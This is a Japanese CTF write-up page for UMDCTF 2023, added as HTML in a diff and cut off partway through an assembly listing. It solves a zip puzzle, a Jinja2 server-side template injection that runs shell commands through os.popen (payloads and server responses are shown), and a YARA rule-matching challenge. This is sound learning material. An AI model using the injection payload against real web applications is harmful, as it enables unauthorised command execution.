@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>UMDCTF 2023 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/umdctf_2023/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="UMDCTF 2023 Writeup" />
+<meta property="og:description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/umdctf_2023/" />
+<meta property="article:published_time" content="2023-05-04T14:00:00+09:00" />
+<meta property="article:modified_time" content="2023-05-04T14:00:00+09:00" />
+<meta itemprop="name" content="UMDCTF 2023 Writeup">
+<meta itemprop="description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日">
+<meta itemprop="datePublished" content="2023-05-04T14:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2023-05-04T14:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="4091">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="UMDCTF 2023 Writeup"/>
+<meta name="twitter:description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">UMDCTF 2023 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2023-05-04 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc-ports-50-points">[misc]: Ports (50 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-pop-calc-175-points">[Web]: pop calc (175 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-yara-trainer-gym-427-points">[Forensics]: YARA Trainer Gym (427 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-telekinetic-warfare-442-points">[Forensics]: Telekinetic Warfare (442 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-malware-chall-disclaimer-0-point">[Forensics]: Malware Chall Disclaimer (0 point)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-doctors-hate-him-482-points">[Forensics]: Doctors hate him!! (482 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#unsolved">(Unsolved)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fumdctf_2023%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://umdctf.io/challenges">https://umdctf.io/challenges</a>
+<br /><br /></p>
+<p>UMDCTF は、3回目の参加です。</p>
+<p><a href="https://captureamerica.github.io/writeups/post/umdctf_2020/">UMDCTF 2020</a> (147位)</p>
+<p><a href="https://captureamerica.github.io/writeups/post/umdctf_2021/">UMDCTF 2021</a> (175位)</p>
+<p><br /></p>
+<p>今回は 1533 points を取り、161位でした。</p>
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Score.png" alt="umdctf_2023_Score.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges1.png" alt="umdctf_2023_Challenges1.png">
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges2.png" alt="umdctf_2023_Challenges2.png">
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges3.png" alt="umdctf_2023_Challenges3.png">
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges4.png" alt="umdctf_2023_Challenges4.png">
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges5.png" alt="umdctf_2023_Challenges5.png">
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges6.png" alt="umdctf_2023_Challenges6.png">
+<p><br />
+日曜日は、大好きなモンハンもやらず、ほぼ丸一日これをやってました。</p>
+<p>未着手のチャレンジも多くありますが、やった中でもいくつか面白いチャレンジがあって、良いCTFイベントだった思います。</p>
+<p><br /><br /></p>
+<h2 id="misc-ports-50-points">[misc]: Ports (50 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>You are a network packet transporting sensitive information to a very important user. Unfortunately, your human forgot to tell you which port to use. This is a problem as there are 65335 different ports! Luckily, each of these ports might tell you something&hellip;
+<br /><br />
+Note: The password to each encrypted .zip file is the corresponding port number. For example: Password to port-16.txt.zip is simply 16.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>ports.zip</li>
+</ul>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>まず、ports.zipを解凍すると、<code>port-1.txt.zip</code> 〜 <code>port-65335.txt.zip</code> の Zipファイルが出てきます。</p>
+<p>（なぜ、<code>65535</code> ではなく <code>65335</code> だったのかは不明。）</p>
+<p><br /></p>
+<p>まずは、一気に解凍してきます。</p>
+<pre>
+$ for i in {1..65335} ; do (unzip -P $i port-$i.txt.zip) ; done
+</pre>
+<p>すると今度は、<code>port-1.txt</code> 〜 <code>port-65335.txt</code> のテキストファイルが出てきます。（後述しますが、厳密には解凍できていないファイルがありました。）</p>
+<p><br /></p>
+<p>テキストファイルの中身は、以下のような感じになっていて、別のファイルを見るように指示があります。</p>
+<pre>
+Go to port 22603 instead :(
+
+Random message: nkjhefswxbtwmxluffgzxyfoybdlpxkxlwrnmfxpalsugtwgjcottukxivjjzwiblnvkpsflmtwjiudvmqjc
+</pre>
+<p><br /></p>
+<p>おそらく、flagが入っているテキストファイルには、<code>instead</code> という文字列が出てこないだろうと予想してgrepしてみたのですが、ファイルが多すぎてエラーになりました。</p>
+<pre>
+$ grep -v "instead" *.txt > temp.txt
+-bash: /usr/bin/grep: Argument list too long
+</pre>
+<p><br /></p>
+<p>ということで、一旦全てのテキストファイルの中身を一つのファイルにすることにしました。</p>
+<p>すると、<code>port-42237.txt</code> と <code>port-42318.txt</code> が存在していないことに気が付きました。</p>
+<pre>
+$ for i in {1..65335} ; do (cat port-$i.txt >> ../temp.txt) ; done
+cat: port-42237.txt: No such file or directory
+cat: port-42318.txt: No such file or directory
+</pre>
+<p><br /></p>
+<p>どうやら unzip コマンドが失敗していたようです。</p>
+<p>個別にコマンドを実行してみると、以下のエラーが出てきました。</p>
+<pre>
+$ unzip -P 42237 ../zip/port-42237.txt.zip
+Archive:  ../zip/port-42237.txt.zip
+   skipping: port-42237.txt          need PK compat. v5.1 (can do v4.5)
+
+$ unzip -P 42318 ../zip/port-42318.txt.zip
+Archive:  ../zip/port-42318.txt.zip
+   skipping: port-42318.txt          need PK compat. v5.1 (can do v4.5)
+</pre>
+<p><br /></p>
+<p>ちなみに、unzipで解凍できたものと、できなかったもののファイルタイプの違いは以下の通りです。</p>
+<pre>
+$ file port-42236.txt.zip
+port-42236.txt.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
+
+$ file port-42237.txt.zip
+port-42237.txt.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
+</pre>
+<p>Macの解凍ツールでは普通に解凍できたので、フラグはゲットできました。</p>
+<p><br /></p>
+<p>Flag: <code>UMDCTF{dDSA-d_23+t0ta11y_n0t_NSFW_tCp_pAcKET-0_0-15039254&amp;((*#@!}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-pop-calc-175-points">[Web]: pop calc (175 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>We have created a new calculator application to fit all your mathematical needs. Give it a try!
+<br /><br />
+<a href="https://pop-calc.chall.lol">https://pop-calc.chall.lol</a></p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>サイトにアクセスすると電卓があり、計算ができるようになっています。</p>
+<p>POSTデータを見てみると、<code>calc=</code> というパラメータに計算式がセットされて送信されていました。</p>
+<p><br /></p>
+<p>試しに Burp Suiteの Repeaterを使って <code>calc={{ config }}</code> をPOSTしてみると、設定値が取れました。</p>
+<p>以下が、サーバーからのレスポンスです。</p>
+<pre>
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Cloud-Trace-Context: 21d9ab888b0014774d78d7ea940cb502;o=1
+Date: Sun, 30 Apr 2023 11:33:28 GMT
+Server: Google Frontend
+Content-Length: 925
+
+[ERROR] &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
+</pre>
+<p><br /></p>
+<p>SSTI (Server-Side Template Injection) ってやつですかね。</p>
+<p>以下を参考にしました。（OSCPのときには、よくお世話になりました。）</p>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti</a></p>
+<p><br /></p>
+<p>以下のように、任意のコマンドが実行できました。（注: calcの部分は、POSTしているデータのみ書いてます）</p>
+<pre>
+calc={{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Cloud-Trace-Context: bee9296169e7cb2f70911bff50bc1d16;o=1
+Date: Sun, 30 Apr 2023 11:36:12 GMT
+Server: Google Frontend
+Content-Length: 51
+
+[ERROR] app.py
+flag.txt
+requirements.txt
+templates
+
+
+calc={{ config.__class__.from_envvar.__globals__.import_string("os").popen("cat flag.txt").read() }}
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Cloud-Trace-Context: 5de4b10dcbd8accd9395c41818d67939;o=1
+Date: Sun, 30 Apr 2023 11:37:10 GMT
+Server: Google Frontend
+Content-Length: 49
+
+[ERROR] UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}
+</pre>
+<p><br /></p>
+<p>Flag: <code>UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-yara-trainer-gym-427-points">[Forensics]: YARA Trainer Gym (427 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>My pokemon aren&rsquo;t very strong yet so I need to slip past the sigs written by the 8 YARA gym leaders! Can you help me!!!
+<br /><br />
+Note: you can run the yara rules locally with yara yara_rules.yar $file
+<br /><br />
+<a href="https://yara-trainer-gym.chall.lol">https://yara-trainer-gym.chall.lol</a></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>yara_rules.yar</li>
+</ul>
+<p>中身：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">import</span> <span class="s">&#34;elf&#34;</span>
+<span class="n">import</span> <span class="s">&#34;math&#34;</span>
+
+<span class="n">rule</span> <span class="n">rule1</span> <span class="p">{</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">uint32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x464c457f</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule2</span> <span class="p">{</span>
+    <span class="nl">strings</span><span class="p">:</span>
+        <span class="err">$</span><span class="n">rocket1</span> <span class="o">=</span> <span class="s">&#34;jessie&#34;</span>
+        <span class="err">$</span><span class="n">rocket2</span> <span class="o">=</span> <span class="s">&#34;james&#34;</span>
+        <span class="err">$</span><span class="n">rocket3</span> <span class="o">=</span> <span class="s">&#34;meowth&#34;</span>
+
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">all</span> <span class="n">of</span> <span class="p">(</span><span class="err">$</span><span class="n">rocket</span><span class="o">*</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule3</span> <span class="p">{</span>
+    <span class="nl">meta</span><span class="p">:</span>
+        <span class="n">description</span> <span class="o">=</span> <span class="s">&#34;Number of sections in a binary&#34;</span>
+     <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">elf</span><span class="p">.</span><span class="n">number_of_sections</span> <span class="o">==</span> <span class="mi">40</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule4</span> <span class="p">{</span>
+    <span class="nl">strings</span><span class="p">:</span>
+        <span class="err">$</span><span class="n">hex1</span> <span class="o">=</span> <span class="p">{</span><span class="mi">73</span> <span class="mf">6f</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">67</span> <span class="mi">73</span> <span class="mf">6f</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">67</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">61</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">72</span> <span class="mi">65</span><span class="p">}</span>
+        <span class="err">$</span><span class="n">hex2</span> <span class="o">=</span> <span class="p">{</span><span class="mi">5445414</span><span class="n">d524f434b4554</span><span class="p">}</span>
+        <span class="err">$</span><span class="n">hex3</span> <span class="o">=</span> <span class="p">{</span><span class="mi">696</span><span class="n">d20736f207469726564</span><span class="p">}</span>
+        <span class="err">$</span><span class="n">hex4</span> <span class="o">=</span> <span class="p">{</span><span class="mi">736</span><span class="n">c656570792074696d65</span><span class="p">}</span>
+
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="p">(</span><span class="err">$</span><span class="n">hex1</span> <span class="n">and</span> <span class="err">$</span><span class="n">hex2</span><span class="p">)</span> <span class="n">or</span> <span class="p">(</span><span class="err">$</span><span class="n">hex3</span> <span class="n">and</span> <span class="err">$</span><span class="n">hex4</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule5</span> <span class="p">{</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">math</span><span class="p">.</span><span class="n">entropy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">filesize</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">6</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule6</span> <span class="p">{</span>
+    <span class="nl">strings</span><span class="p">:</span>
+        <span class="err">$</span><span class="n">xor</span> <span class="o">=</span> <span class="s">&#34;aqvkpjmdofazwf{lqjm1310&lt;&#34;</span> <span class="n">xor</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="err">$</span><span class="n">xor</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule7</span> <span class="p">{</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">any</span> <span class="n">section</span> <span class="n">in</span> <span class="n">elf</span><span class="p">.</span><span class="nl">sections</span> <span class="p">:</span> <span class="p">(</span><span class="n">section</span><span class="p">.</span><span class="n">name</span> <span class="o">==</span> <span class="s">&#34;poophaha&#34;</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="n">rule</span> <span class="n">rule8</span> <span class="p">{</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">filesize</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="n">MB</span> <span class="n">and</span> <span class="n">filesize</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="n">MB</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>アクセスしてみると、任意のファイルがアップロードできるようになっています。</p>
+<p>スクリーンショットには全部写っていませんが、Gymは1〜8まであります。</p>
+<p><img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Yara.png" alt="umdctf_2023_Yara.png"> <br /></p>
+<p><br /></p>
+<p>全てのyara ruleの条件にマッチするELFファイルを作成して、アップロードするとフラグが取れるようです。</p>
+<p>これはなかなか面白いチャレンジだと思って、絶対解こうと思って頑張りました。</p>
+<p><br /></p>
+<p>まず、rule1ですが、少しググってみたところ、ファイルタイプかマジックナンバーを見ているだけで、ELFファイルであれば簡単にパスできます。</p>
+<p><br /></p>
+<p>その他の文字列のチェックをしているrule達は、テキトーにプログラムの中に埋め込めばパスできそうです。</p>
+<p>XORをしている rule6 は、CyberChefで Brute Force してみたら、Key=03 でした。</p>
+<p><br /></p>
+<p>とりあえず、以下のようなCのコードを書いてコンパイルし、アップロードしてみました。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;jessie&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;james&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;meowth&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;im so tired&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;sleepy time&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;bruhsinglebytexorin2023?&#34;</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>これだけで、rule1, rule2, rule4, rule6 はクリアできました。</p>
+<p><br /></p>
+<p>しかし、ここから section の追加などの仕方がわからず、結構悩みました。</p>
+<p>おそらく、ldコマンドでscript fileを使ってオブジェクトファイルをリンクするとできそうなのですが、<code>gcc -c</code> で作った.oファイルはldコマンドでうまくリンクできませんでした。</p>
+<pre>
+$ ld -o a.out YARA_solve.o
+ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000
+ld: YARA_solve.o: in function `main':
+YARA_solve.c:(.text+0x1e): undefined reference to `puts'
+ld: YARA_solve.c:(.text+0x2d): undefined reference to `puts'
+ld: YARA_solve.c:(.text+0x3c): undefined reference to `puts'
+ld: YARA_solve.c:(.text+0x4b): undefined reference to `puts'
+ld: YARA_solve.c:(.text+0x5a): undefined reference to `puts'
+ld: YARA_solve.o:YARA_solve.c:(.text+0x69): more undefined references to `puts' follow
+</pre>
+<p><br />
+結局、Cで書くのを諦めて、アセンブラで書きました。</p>
+<p>参考にさせていただいたサイト：</p>
+<p><a href="http://yaguchi.txt-nifty.com/blog/2006/07/as_ldhello_worl_5d68.html">http://yaguchi.txt-nifty.com/blog/2006/07/as_ldhello_worl_5d68.html</a></p>
+<p><a href="https://community-ja.renesas.com/cafe_rene/forums-groups/tools/f/forum21/4964/e2-studio">https://community-ja.renesas.com/cafe_rene/forums-groups/tools/f/forum21/4964/e2-studio</a></p>
+<p><br /></p>
+<p>とりあえず、自分が解いた方法を以下に書きますが、もっと簡単なやり方があるかも知れないです。</p>
+<p><br /></p>
+<p>以下が用意したアセンブラのコード。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="hl"><span class="lnt">24
+</span></span><span class="hl"><span class="lnt">25
+</span></span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.data</span>
